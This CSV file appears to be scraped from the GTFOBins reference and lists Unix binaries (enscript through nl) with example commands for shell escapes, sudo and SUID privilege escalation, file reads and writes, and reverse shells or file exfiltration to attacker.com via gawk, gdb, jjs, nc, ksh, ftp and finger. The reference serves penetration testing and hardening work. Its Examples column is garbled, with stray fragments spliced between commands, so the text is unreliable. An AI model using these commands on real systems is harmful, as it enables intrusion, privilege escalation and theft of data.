Binary Name,URL,Description,Functions,Examples
enscript,https://gtfobins.github.io/gtfobins/enscript/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,enscript /dev/null -qo /dev/null -I '/bin/sh >&2'; sudo; sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
env,https://gtfobins.github.io/gtfobins/env/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,env /bin/sh; sh -p; -p
eqn,https://gtfobins.github.io/gtfobins/eqn/,"The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.",File read; SUID; Sudo,"LFILE=file_to_read
eqn ""$LFILE""; sh -p; -p"
espeak,https://gtfobins.github.io/gtfobins/espeak/,"The file content appears in the middle of other textual information, thus it might not be suitable to read arbitray binary files.",File read; SUID; Sudo,"LFILE=file_to_read
espeak -qXf ""$LFILE""; sh -p; -p"
ex,https://gtfobins.github.io/gtfobins/ex/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo,"ex
!/bin/sh; ex file_to_write
a
DATA
.
w
q; ex file_to_read
,p
q"
exiftool,https://gtfobins.github.io/gtfobins/exiftool/,"If the permissions allow it, files are moved (instead of copied) to the destination.",File write; File read; Sudo,"LFILE=file_to_write
INPUT=input_file
exiftool -filename=$LFILE $INPUT; LFILE=file_to_read
OUTPUT=output_file
exiftool -filename=$OUTPUT $LFILE
cat $OUTPUT; sudo"
expand,https://gtfobins.github.io/gtfobins/expand/,The read file content is corrupted by replacing tabs with spaces.,File read; SUID; Sudo,"LFILE=file_to_read
expand ""$LFILE""; sh -p; -p"
expect,https://gtfobins.github.io/gtfobins/expect/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; SUID; Sudo,"expect -c 'spawn /bin/sh;interact'; expect; LFILE=file_to_read
expect $LFILE"
facter,https://gtfobins.github.io/gtfobins/facter/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"TF=$(mktemp -d)
echo 'exec(""/bin/sh"")' > $TF/x.rb
FACTERLIB=$TF facter; sudo; TF=$(mktemp -d)
echo 'exec(""/bin/sh"")' > $TF/x.rb
sudo FACTERLIB=$TF facter"
file,https://gtfobins.github.io/gtfobins/file/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"file; :; LFILE=file_to_read
file -f $LFILE"
find,https://gtfobins.github.io/gtfobins/find/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; SUID; Sudo,"find . -exec /bin/sh \; -quit; LFILE=file_to_write
find / -fprintf ""$FILE"" DATA -quit; sh -p"
finger,https://gtfobins.github.io/gtfobins/finger/,finger hangs waiting for the remote peer to close the socket.,File upload; File download,"finger; sudo nc -l -p 79 | base64 -d > ""file_to_save""; RHOST=attacker.com
LFILE=file_to_send
finger ""$(base64 $LFILE)@$RHOST"""
fish,https://gtfobins.github.io/gtfobins/fish/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,fish; sh -p; -p
flock,https://gtfobins.github.io/gtfobins/flock/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,flock -u / /bin/sh; sh -p; -p
fmt,https://gtfobins.github.io/gtfobins/fmt/,The read file content is not binary-safe.,File read; SUID; Sudo,"fmt; LFILE=file_to_read
fmt -pNON_EXISTING_PREFIX ""$LFILE""; LFILE=file_to_read
fmt -999 ""$LFILE"""
fold,https://gtfobins.github.io/gtfobins/fold/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
fold -w99999999 ""$LFILE""; sh -p; -p"
fping,https://gtfobins.github.io/gtfobins/fping/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; Sudo,"LFILE=file_to_read
fping -f $LFILE; sudo; LFILE=file_to_read
sudo fping -f $LFILE"
ftp,https://gtfobins.github.io/gtfobins/ftp/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File upload; File download; Sudo,"ftp
!/bin/sh; RHOST=attacker.com
ftp $RHOST
put file_to_send; RHOST=attacker.com
ftp $RHOST
get file_to_get"
gawk,https://gtfobins.github.io/gtfobins/gawk/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Non-interactive reverse shell; Non-interactive bind shell; File write; File read; SUID; Sudo; Limited SUID,"gawk 'BEGIN {system(""/bin/sh"")}'; nc -l -p 12345; RHOST=attacker.com
RPORT=12345
gawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
    s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
gcc,https://gtfobins.github.io/gtfobins/gcc/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo,"gcc -wrapper /bin/sh,-s .; LFILE=file_to_delete
gcc -xc /dev/null -o $LFILE; LFILE=file_to_read
gcc -x c -E ""$LFILE"""
gcloud,https://gtfobins.github.io/gtfobins/gcloud/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"less; gcloud help
!/bin/sh; sudo"
gcore,https://gtfobins.github.io/gtfobins/gcore/,"It can be used to generate core dumps of running processes. Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named core.$PID, that is then often filtered with strings to narrow down relevant information.",File read; SUID; Sudo,core.$PID; strings; gcore $PID
gdb,https://gtfobins.github.io/gtfobins/gdb/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File upload; File download; File write; File read; Library load; SUID; Sudo; Capabilities,"gdb -nx -ex '!sh' -ex quit; socat file:`tty`,raw,echo=0 tcp-listen:12345; export RHOST=attacker.com
export RPORT=12345
gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")' -ex quit"
gem,https://gtfobins.github.io/gtfobins/gem/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"rdoc; gem open -e ""/bin/sh -c /bin/sh"" rdoc; vi"
genie,https://gtfobins.github.io/gtfobins/genie/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,genie -c '/bin/sh'; sh -p; -p
genisoimage,https://gtfobins.github.io/gtfobins/genisoimage/,"The output is placed inside the ISO9660 file system binary format thus it may not be suitable for binary content as is, yet it can be mounted or extracted with tools like 7z.",File read; SUID; Sudo,"7z; LFILE=file_to_read
genisoimage -q -o - ""$LFILE""; sh -p"
ghc,https://gtfobins.github.io/gtfobins/ghc/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"ghc -e 'System.Process.callCommand ""/bin/sh""'; sudo; sudo ghc -e 'System.Process.callCommand ""/bin/sh""'"
ghci,https://gtfobins.github.io/gtfobins/ghci/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"ghci
System.Process.callCommand ""/bin/sh""; sudo; sudo ghci
System.Process.callCommand ""/bin/sh"""
gimp,https://gtfobins.github.io/gtfobins/gimp/,The binary hangs after executing the Python code and can be terminated pressing ctrl-c.,Shell; Reverse shell; File upload; File download; File write; File read; Library load; SUID; Sudo,"ctrl-c; gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'; socat file:`tty`,raw,echo=0 tcp-listen:12345"
ginsh,https://gtfobins.github.io/gtfobins/ginsh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"ginsh
!/bin/sh; sudo; sudo ginsh
!/bin/sh"
git,https://gtfobins.github.io/gtfobins/git/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo; Limited SUID,"PAGER='sh -c ""exec sh 0<&1""' git -p help; less; git help config
!/bin/sh"
grc,https://gtfobins.github.io/gtfobins/grc/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,grc --pty /bin/sh; sudo; sudo grc --pty /bin/sh
grep,https://gtfobins.github.io/gtfobins/grep/,"There are many grep flavors that in many cases are just copies, symlinks or wrappers around the original binary that may share the same behavior, for example: egrep, fgrep, zgrep, etc.",File read; SUID; Sudo,grep; egrep; fgrep
gtester,https://gtfobins.github.io/gtfobins/gtester/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; SUID; Sudo,"TF=$(mktemp)
echo '#!/bin/sh' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
gtester -q $TF; <testbinary path=""DATA"">; LFILE=file_to_write
gtester ""DATA"" -o $LFILE"
gzip,https://gtfobins.github.io/gtfobins/gzip/,"There are also a number of other utilities that rely on gzip under the hood, e.g., zless, zcat, gunzip, etc. Besides having similar features, they also allow privileged reads if gzip itself is SUID.",File read; SUID; Sudo,gzip; zless; zcat
hd,https://gtfobins.github.io/gtfobins/hd/,The output is actually an hex dump.,File read; SUID; Sudo,"LFILE=file_to_read
hd ""$LFILE""; sh -p; -p"
head,https://gtfobins.github.io/gtfobins/head/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
head -c1G ""$LFILE""; sh -p; -p"
hexdump,https://gtfobins.github.io/gtfobins/hexdump/,The output is actually an hex dump.,File read; SUID; Sudo,"LFILE=file_to_read
hexdump -C ""$LFILE""; sh -p; -p"
highlight,https://gtfobins.github.io/gtfobins/highlight/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
highlight --no-doc --failsafe ""$LFILE""; sh -p; -p"
hping3,https://gtfobins.github.io/gtfobins/hping3/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,"hping3
/bin/sh; sh -p; -p"
iconv,https://gtfobins.github.io/gtfobins/iconv/,"The 8859_1 encoding is used as it accepts any single-byte sequence, thus it allows to read/write arbitrary files. Other encoding combinations may corrupt the result.",File write; File read; SUID; Sudo,"8859_1; LFILE=file_to_write
echo ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE""; LFILE=file_to_read
iconv -f 8859_1 -t 8859_1 ""$LFILE"""
iftop,https://gtfobins.github.io/gtfobins/iftop/,This requires iftop 0.17 and the privilege to capture on some device (specify with -i if needed) .,Shell; Sudo; Limited SUID,"iftop; -i; iftop
!/bin/sh"
install,https://gtfobins.github.io/gtfobins/install/,"This can be run with elevated privileges to change permissions (6 denotes the SUID bits) and then read, write, or execute a copy of the file.",SUID; Sudo,6; sh -p; -p
ionice,https://gtfobins.github.io/gtfobins/ionice/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,ionice /bin/sh; sh -p; -p
ip,https://gtfobins.github.io/gtfobins/ip/,The read file content is corrupted by error prints.,File read; SUID; Sudo,"LFILE=file_to_read
ip -force -batch ""$LFILE""; sh -p; -p"
irb,https://gtfobins.github.io/gtfobins/irb/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File upload; File download; File write; File read; Library load; Sudo,"irb
exec '/bin/bash'; nc -l -p 12345; export RHOST='127.0.0.1'
export RPORT=9000
irb
require 'socket'; exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read} end"
ispell,https://gtfobins.github.io/gtfobins/ispell/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,"ispell /etc/passwd
!/bin/sh; sh -p; -p"
jjs,https://gtfobins.github.io/gtfobins/jjs/,This tool is installed starting with Java SE 8.,Shell; Reverse shell; File download; File write; File read; SUID; Sudo,"echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | jjs; nc -l -p 12345; export RHOST=attacker.com
export RPORT=12345
echo 'var host=Java.type(""java.lang.System"").getenv(""RHOST"");
var port=Java.type(""java.lang.System"").getenv(""RPORT"");
var ProcessBuilder = Java.type(""java.lang.ProcessBuilder"");
var p=new ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start();
var Socket = Java.type(""java.net.Socket"");
var s=new Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(""java.lang.Thread"").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs"
joe,https://gtfobins.github.io/gtfobins/joe/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"joe
^K!/bin/sh; sudo; sudo joe
^K!/bin/sh"
join,https://gtfobins.github.io/gtfobins/join/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
join -a 2 /dev/null $LFILE; sh -p; -p"
journalctl,https://gtfobins.github.io/gtfobins/journalctl/,"This invokes the default pager, which is likely to be less, other functions may apply.",Shell; Sudo,"less; journalctl
!/bin/sh; sudo"
jq,https://gtfobins.github.io/gtfobins/jq/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
jq -Rr . ""$LFILE""; sh -p; -p"
jrunscript,https://gtfobins.github.io/gtfobins/jrunscript/,This tool is installed starting with Java SE 6.,Shell; Reverse shell; File download; File write; File read; SUID; Sudo,"jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""; nc -l -p 12345; export RHOST=attacker.com
export RPORT=12345
jrunscript -e 'var host='""'""""$RHOST""""'""'; var port='""$RPORT""';
var p=new java.lang.ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start();
var s=new java.net.Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();po.flush();
java.lang.Thread.sleep(50);
try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'"
jtag,https://gtfobins.github.io/gtfobins/jtag/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"jtag --interactive
shell /bin/sh; sudo; sudo jtag --interactive
shell /bin/sh"
julia,https://gtfobins.github.io/gtfobins/julia/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File download; File write; File read; SUID; Sudo,"julia -e 'run(`/bin/sh`)'; nc -l -p 12345; export RHOST=attacker.com
export RPORT=12345
julia -e 'using Sockets; sock=connect(ENV[""RHOST""], parse(Int64,ENV[""RPORT""])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'"
knife,https://gtfobins.github.io/gtfobins/knife/,This is capable of running ruby code.,Shell; Sudo,"ruby; knife exec -E 'exec ""/bin/sh""'; sudo"
ksh,https://gtfobins.github.io/gtfobins/ksh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File upload; File download; File write; File read; SUID; Sudo,"ksh; nc -l -p 12345; export RHOST=attacker.com
export RPORT=12345
ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'"
ksshell,https://gtfobins.github.io/gtfobins/ksshell/,Each line is corrupted by a prefix string. Also consider that lines are actually parsed as kickstart scripts thus some file contents may lead to unexpected results.,File read; SUID; Sudo,"kickstart; LFILE=file_to_read
ksshell -i $LFILE; sh -p"
ksu,https://gtfobins.github.io/gtfobins/ksu/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,sudo; sudo ksu -q -e /bin/sh
kubectl,https://gtfobins.github.io/gtfobins/kubectl/,"It serves files from a specified directory via HTTP, i.e., http://<IP>:4444/x/<file>.",File upload; SUID; Sudo,"http://<IP>:4444/x/<file>; LFILE=dir_to_serve
kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/; sh -p"
latex,https://gtfobins.github.io/gtfobins/latex/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo; Limited SUID,"latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'; latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi; sudo"
latexmk,https://gtfobins.github.io/gtfobins/latexmk/,This allows to execute perl code.,Shell; File read; Sudo,"perl; latexmk -e 'exec ""/bin/sh"";'; latexmk -latex='/bin/sh #' /dev/null"
ld.so,https://gtfobins.github.io/gtfobins/ld.so/,"ld.so is the Linux dynamic linker/loader, its filename and location might change across distributions. The proper path is can be obtained with:",Shell; SUID; Sudo,"ld.so; $ strings /proc/self/exe | head -1
/lib64/ld-linux-x86-64.so.2; /lib/ld.so /bin/sh"
ldconfig,https://gtfobins.github.io/gtfobins/ldconfig/,Follows a minimal example of how to use the described technique (details may change across different distributions).,Sudo; Limited SUID,"libcap; ping; $ ldd /bin/ping | grep libcap
      libcap.so.2 => /tmp/tmp.9qfoUyKaGu/libcap.so.2 (0x00007fc7e9797000)"
less,https://gtfobins.github.io/gtfobins/less/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo,"less /etc/profile
!/bin/sh; VISUAL=""/bin/sh -c '/bin/sh'"" less /etc/profile
v; less /etc/profile
v:shell"
lftp,https://gtfobins.github.io/gtfobins/lftp/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,lftp -c '!/bin/sh'; sudo; sudo lftp -c '!/bin/sh'
links,https://gtfobins.github.io/gtfobins/links/,The result is displayed in a TUI interface.,File read; SUID; Sudo,"LFILE=file_to_read
links ""$LFILE""; sh -p; -p"
ln,https://gtfobins.github.io/gtfobins/ln/,"This overrides ln itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a sudo rule allows to only run ln by path. Warning, this is a destructive action.",Sudo,"ln; sudo; sudo ln -fs /bin/sh /bin/ln
sudo ln"
loginctl,https://gtfobins.github.io/gtfobins/loginctl/,"This invokes the default pager, which is likely to be less, other functions may apply.",Shell; Sudo,"less; loginctl user-status
!/bin/sh; sudo"
logsave,https://gtfobins.github.io/gtfobins/logsave/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,logsave /dev/null /bin/sh -i; sh -p; -p
look,https://gtfobins.github.io/gtfobins/look/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
look '' ""$LFILE""; sh -p; -p"
lp,https://gtfobins.github.io/gtfobins/lp/,It can exfiltrate files on the network.,File upload,cups; lpadmin -p printer -v socket://localhost -E; lpadmin -d printer
ltrace,https://gtfobins.github.io/gtfobins/ltrace/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo,"ltrace -b -L /bin/sh; ltrace -F DATA; LFILE=file_to_write
ltrace -s 999 -o $LFILE ltrace -F DATA"
lua,https://gtfobins.github.io/gtfobins/lua/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Non-interactive reverse shell; Non-interactive bind shell; File upload; File download; File write; File read; SUID; Sudo; Limited SUID,"lua -e 'os.execute(""/bin/sh"")'; nc -l -p 12345; lua-socket"
lualatex,https://gtfobins.github.io/gtfobins/lualatex/,This allows to execute lua code.,Shell; Sudo; Limited SUID,"lua; lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'; sudo"
luatex,https://gtfobins.github.io/gtfobins/luatex/,This allows to execute lua code.,Shell; Sudo; Limited SUID,"lua; luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'; sudo"
lwp-download,https://gtfobins.github.io/gtfobins/lwp-download/,Fetch a remote file via HTTP GET request.,File download; File write; File read; Sudo,"URL=http://attacker.com/file_to_get
LFILE=file_to_save
lwp-download $URL $LFILE; LFILE=file_to_write
TF=$(mktemp)
echo DATA >$TF
lwp-download file://$TF $LFILE; LFILE=file_to_read
TF=$(mktemp)
lwp-download ""file://$LFILE"" $TF
cat $TF"
lwp-request,https://gtfobins.github.io/gtfobins/lwp-request/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; Sudo,"LFILE=file_to_read
lwp-request ""file://$LFILE""; sudo; LFILE=file_to_read
sudo lwp-request ""file://$LFILE"""
mail,https://gtfobins.github.io/gtfobins/mail/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"mail --exec='!/bin/sh'; TF=$(mktemp)
echo ""From nobody@localhost $(date)"" > $TF
mail -f $TF
!/bin/sh; sudo"
make,https://gtfobins.github.io/gtfobins/make/,All these examples only work with GNU make due to the lack of support of the --eval flag. The same can be achieved by using a proper Makefile or by passing the content via stdin using -f -.,Shell; File write; SUID; Sudo,make; --eval; Makefile
man,https://gtfobins.github.io/gtfobins/man/,"This invokes the default pager, which is likely to be  less, other functions may apply.",Shell; File read; Sudo,"less; man man
!/bin/sh; man"
mawk,https://gtfobins.github.io/gtfobins/mawk/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo; Limited SUID,"mawk 'BEGIN {system(""/bin/sh"")}'; LFILE=file_to_write
mawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'; LFILE=file_to_read
mawk '//' ""$LFILE"""
minicom,https://gtfobins.github.io/gtfobins/minicom/,"Note that in some versions, Meta-Z is used in place of Ctrl-A.",Shell; SUID; Sudo,Meta-Z; Ctrl-A; Ctrl-A o
more,https://gtfobins.github.io/gtfobins/more/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; SUID; Sudo,"TERM= more /etc/profile
!/bin/sh; more file_to_read; sh -p"
mosquitto,https://gtfobins.github.io/gtfobins/mosquitto/,"The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message, thus it may not be suitable for reading arbitrary files",File read; SUID; Sudo,"LFILE=file_to_read
mosquitto -c ""$LFILE""; sh -p; -p"
mount,https://gtfobins.github.io/gtfobins/mount/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,"sudo; mount; sudo mount -o bind /bin/sh /bin/mount
sudo mount"
msfconsole,https://gtfobins.github.io/gtfobins/msfconsole/,This allows to spawn a ruby interpreter.,Shell; Sudo,"ruby; sudo msfconsole
msf6 > irb
>> system(""/bin/sh""); sudo"
msgattrib,https://gtfobins.github.io/gtfobins/msgattrib/,"The file is parsed and displayed as a Java .properties file, so this may not be suitable to read arbitrary binary data.",File read; SUID; Sudo,".properties; LFILE=file_to_read
msgattrib -P $LFILE; sh -p"
msgcat,https://gtfobins.github.io/gtfobins/msgcat/,"The file is parsed and displayed as a Java .properties file, so this may not be suitable to read arbitrary binary data.",File read; SUID; Sudo,".properties; LFILE=file_to_read
msgcat -P $LFILE; sh -p"
msgconv,https://gtfobins.github.io/gtfobins/msgconv/,"The file is parsed and displayed as a Java .properties file, so this may not be suitable to read arbitrary binary data.",File read; SUID; Sudo,".properties; LFILE=file_to_read
msgconv -P $LFILE; sh -p"
msgfilter,https://gtfobins.github.io/gtfobins/msgfilter/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; SUID; Sudo,-i; kill; echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
msgmerge,https://gtfobins.github.io/gtfobins/msgmerge/,"The file is parsed and displayed as a Java .properties file, so this may not be suitable to read arbitrary binary data.",File read; SUID; Sudo,".properties; LFILE=file_to_read
msgmerge -P $LFILE /dev/null; sh -p"
msguniq,https://gtfobins.github.io/gtfobins/msguniq/,"The file is parsed and displayed as a Java .properties file, so this may not be suitable to read arbitrary binary data.",File read; SUID; Sudo,".properties; LFILE=file_to_read
msguniq -P $LFILE; sh -p"
mtr,https://gtfobins.github.io/gtfobins/mtr/,The read file content is corrupted by error prints.,File read; Sudo,"LFILE=file_to_read
mtr --raw -F ""$LFILE""; sudo; LFILE=file_to_read
sudo mtr --raw -F ""$LFILE"""
multitime,https://gtfobins.github.io/gtfobins/multitime/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,multitime /bin/sh; sh -p; -p
mv,https://gtfobins.github.io/gtfobins/mv/,This can be used to move and then read or write files from a restricted file systems or with elevated privileges.,SUID; Sudo,sh -p; -p; sh
mysql,https://gtfobins.github.io/gtfobins/mysql/,A valid MySQL server must be available.,Shell; Library load; Sudo; Limited SUID,mysql -e '\! /bin/sh'; /path/to/lib.so; mysql --default-auth ../../../../../path/to/lib
nano,https://gtfobins.github.io/gtfobins/nano/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo; Limited SUID,"nano
^R^X
reset; sh 1>&0 2>&0; SPELL; -s"
nasm,https://gtfobins.github.io/gtfobins/nasm/,"The file content is treated as command line options and disclosed throught error messages, so this is not suitable for reading arbitrary binary data.",File read; SUID; Sudo,"LFILE=file_to_read
nasm -@ $LFILE; sh -p; -p"
nawk,https://gtfobins.github.io/gtfobins/nawk/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Non-interactive reverse shell; Non-interactive bind shell; File write; File read; SUID; Sudo; Limited SUID,"nawk 'BEGIN {system(""/bin/sh"")}'; nc -l -p 12345; RHOST=attacker.com
RPORT=12345
nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
    s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
nc,https://gtfobins.github.io/gtfobins/nc/,It can send back a reverse shell to a listening attacker to open a remote network access.,Reverse shell; Bind shell; File upload; File download; Sudo; Limited SUID,"nc -l -p 12345; RHOST=attacker.com
RPORT=12345
nc -e /bin/sh $RHOST $RPORT; nc target.com 12345"
ncdu,https://gtfobins.github.io/gtfobins/ncdu/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"ncdu
b; sudo; sudo ncdu
b"
ncftp,https://gtfobins.github.io/gtfobins/ncftp/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,"ncftp
!/bin/sh; sh -p; -p"
neofetch,https://gtfobins.github.io/gtfobins/neofetch/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo,"TF=$(mktemp)
echo 'exec /bin/sh' >$TF
neofetch --config $TF; LFILE=file_to_read
neofetch --ascii $LFILE; sudo"
nft,https://gtfobins.github.io/gtfobins/nft/,"The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files. This requires version nftables v0.9.0.",File read; SUID; Sudo,"nftables; LFILE=file_to_read
nft -f ""$LFILE""; sh -p"
nice,https://gtfobins.github.io/gtfobins/nice/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,nice /bin/sh; sh -p; -p
nl,https://gtfobins.github.io/gtfobins/nl/,The read file content is corrupted by a leading space added to each line.,File read; SUID; Sudo,"LFILE=file_to_read
nl -bn -w1 -s '' $LFILE; sh -p; -p"
